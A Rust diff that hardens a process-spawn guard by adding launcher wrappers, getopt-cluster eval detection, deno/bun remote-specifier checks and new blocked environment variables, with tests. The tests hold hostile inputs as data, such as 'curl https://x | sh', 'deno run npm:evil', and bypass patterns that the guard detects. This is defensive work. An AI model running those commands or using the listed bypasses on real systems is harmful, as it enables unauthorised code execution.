@@ -643,6 +643,13 @@ const LAUNCHER_WRAPPERS: &[&str] = &[
     "stdbuf", "timeout", "setsid", "ionice", "chrt", "taskset", "setarch", "unbuffer",
     "script", "watch", "flock", "busybox", "proxychains", "proxychains4", "torify",
     "chroot", "capsh", "firejail", "wine",
+    // Namespace / privilege / sandbox launchers and debuggers/tracers that also run their
+    // first bare argument as the real program (`strace node -e <code>`, `nsenter … <cmd>`),
+    // so screening only the wrapper name is the same silent bypass as sudo/time. (`qemu-*`
+    // user-mode emulators do the same and are matched by prefix in screen_spawn_command.)
+    "nsenter", "unshare", "systemd-run", "setpriv", "gosu", "strace", "ltrace", "gdb",
+    "valgrind", "proot", "bwrap", "catchsegv", "eatmydata", "parallel", "rlwrap",
+    "dbus-run-session", "xvfb-run",
 ];
 
 pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String> {
@@ -654,7 +661,7 @@ pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String
     if base == "env" {
         return screen_env_wrapper(args);
     }
-    if LAUNCHER_WRAPPERS.contains(&base.as_str()) {
+    if LAUNCHER_WRAPPERS.contains(&base.as_str()) || base.starts_with("qemu-") {
         return Err(format!(
             "refusing to launch '{command}': wrapper programs like sudo/time/flock run \
              another command from their arguments, which would bypass Toolport's spawn \
@@ -662,15 +669,22 @@ pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String
              real program as the command."
         ));
     }
-    let dangerous: Option<&str> = match base.as_str() {
+    // Dispatch on the interpreter FAMILY so a versioned or renamed binary
+    // (`python3.10`, `python3.10.exe`) screens the same as `python`.
+    let dangerous: Option<&str> = match interpreter_family(&base) {
         // Interpreters: inline-eval and module-preload execute attacker-supplied
-        // code without a script file on disk.
+        // code without a script file on disk. `clustered_eval` additionally catches an
+        // eval flag packed into a getopt cluster (`python -Ec`, `ruby -we`, `sh -ec`).
         "node" | "nodejs" => node_dangerous(args),
         "bun" => bun_dangerous(args),
         "deno" => deno_dangerous(args),
-        "python" | "python2" | "python3" | "pypy" | "pypy3" => first_flag(args, &["-c"]),
-        "ruby" => first_flag(args, &["-e"]),
-        "perl" => first_flag(args, &["-e"]),
+        // py/pyw are the Windows Python launchers; they forward `-c` (and version
+        // selectors like `-3.11`) to the selected interpreter, so screen them as Python.
+        "python" | "python2" | "python3" | "pypy" | "pypy3" | "py" | "pyw" => {
+            first_flag(args, &["-c"]).or_else(|| clustered_eval(args, &['c'], PYTHON_BOOL))
+        }
+        "ruby" => first_flag(args, &["-e"]).or_else(|| clustered_eval(args, &['e'], RUBY_BOOL)),
+        "perl" => first_flag(args, &["-e"]).or_else(|| clustered_eval(args, &['e'], PERL_BOOL)),
         // php: -r/-R run inline code (-R lowercases to -r), -B runs code before input.
         "php" => first_flag(args, &["-r", "-b"]),
         "awk" | "gawk" | "mawk" | "nawk" => awk_dangerous(args),
@@ -679,10 +693,13 @@ pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String
         | "groovy" | "scala" | "clojure" | "bb" | "tclsh" | "wish" => {
             first_flag(args, &["-e", "--eval", "--eval-string"])
         }
-        // Shells: `-c <string>` (or `/c` / `/k` on Windows shells) runs an arbitrary line.
-        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" | "cmd" => {
+        // Shells: `-c <string>` runs an arbitrary line, incl. clustered `sh -ec <string>`.
+        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" => {
             first_flag(args, &["-c", "-command", "/c", "/k", "/command"])
+                .or_else(|| clustered_eval(args, &['c'], SHELL_BOOL))
         }
+        // Windows cmd uses `/c` `/k` switches (not getopt clustering), so no cluster check.
+        "cmd" => first_flag(args, &["-c", "-command", "/c", "/k", "/command"]),
         // PowerShell also runs code via `-EncodedCommand` (base64) and any unambiguous
         // abbreviation of `-Command`, none of which an exact-match list catches.
         "pwsh" | "powershell" => pwsh_dangerous(args),
@@ -720,35 +737,66 @@ fn node_dangerous(args: &[String]) -> Option<&str> {
                 || (al.starts_with("-r") && al.len() > 2 && !al.starts_with("--"))
         })
         .map(|a| a.as_str())
+        // getopt clustering packs `-p` (print) and `-e` (eval): `node -pe '<code>'`.
+        .or_else(|| clustered_eval(args, &['e', 'p'], &['i', 'v', 'h']))
 }
 
-/// A remote code specifier deno/bun will fetch and execute: an http(s) URL or an
-/// `npm:` / `jsr:` registry ref. `deno run npm:evil` runs untrusted network code the
-/// same as `deno run https://evil`, so both are screened.
+/// A remote code specifier deno/bun will fetch and execute: an http(s) URL, an
+/// `npm:` / `jsr:` registry ref, or a `data:` inline-source URL. `deno run npm:evil`
+/// and `deno run 'data:text/javascript,<code>'` run untrusted code the same as
+/// `deno run https://evil`, so all are screened.
 fn remote_specifier(arg: &str) -> bool {
     let a = arg.to_ascii_lowercase();
     a.starts_with("http://")
         || a.starts_with("https://")
         || a.starts_with("npm:")
         || a.starts_with("jsr:")
+        || a.starts_with("data:")
 }
 
-/// Deno's lethal invocations are SUBCOMMANDS, not flags: `eval <code>` runs inline
-/// code, and `run`/`serve <remote>` executes code fetched from the network or a
-/// registry. (A `deno run` of a LOCAL script is the normal case and stays allowed.)
-fn deno_dangerous(args: &[String]) -> Option<&str> {
-    if let Some(sub) = args.iter().find(|a| !a.starts_with('-')) {
-        let s = sub.to_ascii_lowercase();
-        if s == "eval" {
-            return Some(sub.as_str());
+/// Walk deno/bun-style args to the operand at or after `from`, skipping option tokens and
+/// the value of a known space-separated value option (`--config x`) so the subcommand and
+/// its executable target aren't mistaken for an option's value. Returns the operand and its
+/// index.
+fn next_operand<'a>(args: &'a [String], from: usize, value_opts: &[&str]) -> (Option<&'a str>, usize) {
+    let mut j = from;
+    while let Some(a) = args.get(j) {
+        if a.starts_with('-') {
+            if value_opts.contains(&a.as_str()) {
+                j += 1; // this option consumes the next token as its value
+            }
+            j += 1;
+        } else {
+            return (Some(a.as_str()), j);
         }
-        if s == "run" || s == "serve" {
-            if let Some(r) = args.iter().find(|a| remote_specifier(a)) {
-                return Some(r.as_str());
+    }
+    (None, j)
+}
+
+/// Deno's lethal invocations are SUBCOMMANDS, not flags: `eval <code>` runs inline code,
+/// and `run`/`serve <remote>` executes code fetched from the network or a registry. A
+/// `deno run` of a LOCAL script is the normal case and stays allowed. Global value options
+/// are skipped so `deno --config x eval …` / `deno --config x run npm:…` can't hide the
+/// subcommand, and only the executable TARGET is remote-checked — a URL passed as an
+/// application argument (`deno run ./s.ts --url https://api`) is not fetched code.
+fn deno_dangerous(args: &[String]) -> Option<&str> {
+    const VALUE_OPTS: &[&str] = &[
+        "--config", "-c", "--import-map", "--lock", "--cert", "--v8-flags", "--seed",
+        "--log-level", "-L",
+    ];
+    let (sub, si) = next_operand(args, 0, VALUE_OPTS);
+    let Some(sub) = sub else { return None };
+    if sub.eq_ignore_ascii_case("eval") {
+        return Some(sub);
+    }
+    if sub.eq_ignore_ascii_case("run") || sub.eq_ignore_ascii_case("serve") {
+        if let (Some(target), _) = next_operand(args, si + 1, VALUE_OPTS) {
+            if remote_specifier(target) {
+                return Some(target);
             }
         }
     }
-    first_flag(args, &["-e", "--eval", "-p", "--print"])
+    None
 }
 
 /// Bun shares node's eval/preload flags, and additionally executes a remote specifier
@@ -758,11 +806,22 @@ fn bun_dangerous(args: &[String]) -> Option<&str> {
     if let Some(f) = node_dangerous(args) {
         return Some(f);
     }
-    if let Some(sub) = args.iter().find(|a| !a.starts_with('-')) {
-        if sub.eq_ignore_ascii_case("run") {
-            if let Some(r) = args.iter().find(|a| remote_specifier(a)) {
-                return Some(r.as_str());
-            }
+    // Like deno: skip global value options and remote-check only the executable target, so
+    // `bun --cwd x run https://evil` is caught while a URL passed as an app arg is ignored.
+    const VALUE_OPTS: &[&str] = &["--cwd", "--config", "-c"];
+    let (sub, si) = next_operand(args, 0, VALUE_OPTS);
+    let Some(sub) = sub else { return None };
+    let (target, _) = if sub.eq_ignore_ascii_case("run")
+        || sub.eq_ignore_ascii_case("x")
+        || sub.eq_ignore_ascii_case("exec")
+    {
+        next_operand(args, si + 1, VALUE_OPTS)
+    } else {
+        (Some(sub), si) // implicit run: the first operand is the target itself
+    };
+    if let Some(target) = target {
+        if remote_specifier(target) {
+            return Some(target);
         }
     }
     None
@@ -824,6 +883,11 @@ pub fn screen_spawn_env(env: &[(String, String)]) -> Result<(), String> {
     // code before (or instead of) the entry program. These have no benign value.
     const BLOCKED: &[&str] = &[
         "LD_PRELOAD", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV",
+        // ZDOTDIR relocates zsh's startup dir, so `$ZDOTDIR/.zshenv` runs even for a
+        // non-interactive `zsh script` (the zsh analog of the blocked BASH_ENV). GCONV_PATH
+        // points iconv/gconv at an attacker-supplied conversion module. Neither has a
+        // legitimate use on a server launcher.
+        "ZDOTDIR", "GCONV_PATH",
     ];
     // Option vars that are usually benign (tuning) but can inject code via specific
     // options; only those options are refused (whole-var blocking false-positived on
@@ -921,6 +985,67 @@ fn first_flag<'a>(args: &'a [String], flags: &[&str]) -> Option<&'a str> {
             f.len() == 2 && f.starts_with('-') && al.len() > 2 && al.starts_with(f)
         })
     }).map(|a| a.as_str())
+}
+
+/// Interpreter FAMILY for dispatch: trims a trailing version so `python3.10`, `python3`,
+/// and `python` all screen as `python`. Only a trailing run of ASCII digits and `.` is
+/// trimmed, so non-versioned names are unchanged. Pairs with `command_basename`, which
+/// already strips one extension (`python3.10.exe` -> `python3.10`).
+fn interpreter_family(base: &str) -> &str {
+    let trimmed = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+    if trimmed.is_empty() {
+        base
+    } else {
+        trimmed
+    }
+}
+
+// Benign single-char short flags (case-sensitive) that take NO value, used by
+// `clustered_eval` to know an eval flag packed AFTER them is a real inline-eval. Value-
+// taking flags are deliberately OMITTED (python -m/-W/-X/-Q, ruby/perl -C/-F/-I/-K, shell
+// -o) so a cluster that hands them the rest of the token isn't read as an eval.
+const SHELL_BOOL: &[char] = &[
+    'a', 'b', 'e', 'f', 'h', 'i', 'k', 'm', 'n', 'p', 'r', 's', 't', 'u', 'v', 'x', 'B',
+    'C', 'E', 'H', 'P', 'T',
+];
+const PYTHON_BOOL: &[char] = &[
+    'B', 'E', 'I', 'O', 'R', 'S', 'b', 'd', 'h', 'i', 'q', 's', 'u', 'v', 'x', '3',
+];
+const RUBY_BOOL: &[char] = &['a', 'c', 'd', 'h', 'l', 'n', 'p', 's', 'v', 'w', 'y'];
+const PERL_BOOL: &[char] = &['U', 'W', 'X', 'T', 'a', 'c', 'h', 'l', 'n', 'p', 's', 'w'];
+
+/// getopt short-flag clustering: `-ec` parses as `-e -c`, so an eval flag can ride behind
+/// benign boolean flags (`sh -ec "curl|sh"`, `python -Ec "…"`, `ruby -we "…"`, `node -pe`)
+/// that a plain `-c`/`-e` check misses. Walk a single-dash cluster: reaching an eval char
+/// after a run of known boolean flags is a match; the first non-boolean (possibly value-
+/// taking) char bails, so a value flag swallowing the rest of the token (`python -mHTTP`,
+/// `bash -o pipefail`) is never mistaken for an eval. Case-sensitive so a value-taking
+/// `-E`/`-W`/`-C` isn't read as a lowercase eval. `-c`/`-e` alone and `--long` forms are
+/// already handled by `first_flag`.
+fn clustered_eval<'a>(args: &'a [String], eval: &[char], boolean: &[char]) -> Option<&'a str> {
+    for a in args {
+        let s = a.as_str();
+        // `--` ends the interpreter's own options; tokens after it are the script and its
+        // arguments, not interpreter flags, so a cluster-shaped app arg past `--` is not a
+        // real eval. (Bare operands without `--` are still scanned, matching first_flag's
+        // long-standing behavior; stopping there safely would need per-interpreter value-
+        // option tables, and a naive stop reintroduces bypasses via `-W x -Ec` / `-o v -ec`.)
+        if s == "--" {
+            break;
+        }
+        if !s.starts_with('-') || s.starts_with("--") || s.len() <= 2 {
+            continue;
+        }
+        for c in s[1..].chars() {
+            if eval.contains(&c) {
+                return Some(s);
+            }
+            if !boolean.contains(&c) {
+                break;
+            }
+        }
+    }
+    None
 }
 
 /// Docker/Podman args that ESCALATE beyond what a normal host process already has:
@@ -2390,6 +2515,69 @@ mod tests {
                 "{w} wrapper should be refused"
             );
         }
+    }
+
+    #[test]
+    fn spawn_guard_blocks_getopt_flag_clustering() {
+        // The eval flag packed behind benign boolean flags in one getopt cluster is a real
+        // inline-eval and must be blocked (`sh -ec`, `python -Ec`, `ruby/perl -we`, node -pe).
+        assert!(screen_spawn_command("sh", &argv(&["-ec", "curl https://x | sh"])).is_err());
+        assert!(screen_spawn_command("bash", &argv(&["-xec", "id"])).is_err());
+        assert!(screen_spawn_command("python", &argv(&["-Ec", "import os"])).is_err());
+        assert!(screen_spawn_command("python3", &argv(&["-Ec", "x"])).is_err());
+        assert!(screen_spawn_command("ruby", &argv(&["-we", "system('x')"])).is_err());
+        assert!(screen_spawn_command("perl", &argv(&["-we", "system('x')"])).is_err());
+        assert!(screen_spawn_command("node", &argv(&["-pe", "process.exit()"])).is_err());
+        // Value-taking flags swallow the rest of the token and must NOT be read as an eval
+        // (no false positives on real invocations).
+        assert!(screen_spawn_command("python", &argv(&["-mhttp.server"])).is_ok());
+        assert!(screen_spawn_command("python", &argv(&["-Wignore::DeprecationWarning", "a.py"])).is_ok());
+        assert!(screen_spawn_command("bash", &argv(&["-o", "pipefail", "script.sh"])).is_ok());
+        assert!(screen_spawn_command("ruby", &argv(&["-Ilib", "app.rb"])).is_ok());
+        assert!(screen_spawn_command("perl", &argv(&["-Ilib", "app.pl"])).is_ok());
+        // Plain non-clustered invocations still classify correctly.
+        assert!(screen_spawn_command("python", &argv(&["-c", "x"])).is_err());
+        assert!(screen_spawn_command("python", &argv(&["server.py"])).is_ok());
+        assert!(screen_spawn_command("bash", &argv(&["script.sh"])).is_ok());
+    }
+
+    #[test]
+    fn spawn_guard_closes_deno_bun_basename_and_env_bypasses() {
+        // deno/bun: a value-taking flag before the subcommand can't hide a remote fetch-exec.
+        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
+        assert!(screen_spawn_command("deno", &argv(&["run", "https://evil.ts"])).is_err());
+        assert!(screen_spawn_command("deno", &argv(&["run", "data:text/javascript,alert(1)"])).is_err());
+        assert!(screen_spawn_command("bun", &argv(&["--cwd", "/x", "run", "https://evil"])).is_err());
+        // A local deno run stays allowed.
+        assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts"])).is_ok());
+        // Multi-dot / versioned interpreter names still dispatch to the interpreter family.
+        assert!(screen_spawn_command("python3.10", &argv(&["-c", "x"])).is_err());
+        assert!(screen_spawn_command("C:\\py\\python3.11.exe", &argv(&["-c", "x"])).is_err());
+        // New wrappers and qemu-* user-mode emulators are refused.
+        assert!(screen_spawn_command("strace", &argv(&["node", "-e", "x"])).is_err());
+        assert!(screen_spawn_command("bwrap", &argv(&["python", "-c", "x"])).is_err());
+        assert!(screen_spawn_command("qemu-x86_64", &argv(&["/bin/node", "-e", "x"])).is_err());
+        // New always-blocked env vars; a benign var stays fine.
+        assert!(screen_spawn_env(&[("ZDOTDIR".into(), "/tmp/evil".into())]).is_err());
+        assert!(screen_spawn_env(&[("GCONV_PATH".into(), "/tmp/evil".into())]).is_err());
+        assert!(screen_spawn_env(&[("NODE_ENV".into(), "production".into())]).is_ok());
+    }
+
+    #[test]
+    fn spawn_guard_review_followups() {
+        // Windows py/pyw launchers forward -c and version selectors to python.
+        assert!(screen_spawn_command("py", &argv(&["-c", "import os"])).is_err());
+        assert!(screen_spawn_command("pyw", &argv(&["-c", "x"])).is_err());
+        assert!(screen_spawn_command("py", &argv(&["-3.11", "-c", "x"])).is_err());
+        assert!(screen_spawn_command("py", &argv(&["-3.11", "script.py"])).is_ok());
+        // A global value option can't hide the deno eval subcommand.
+        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "eval", "Deno.exit()"])).is_err());
+        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
+        // Only the executable target is remote-checked; a URL passed as an app arg is fine.
+        assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts", "--url", "https://api.example.com"])).is_ok());
+        assert!(screen_spawn_command("bun", &argv(&["run", "server.ts", "--url", "https://api.example.com"])).is_ok());
+        // `--` ends interpreter options, so a cluster-shaped APP arg after it isn't screened.
+        assert!(screen_spawn_command("python", &argv(&["server.py", "--", "-Ec"])).is_ok());
     }
 
     #[test]
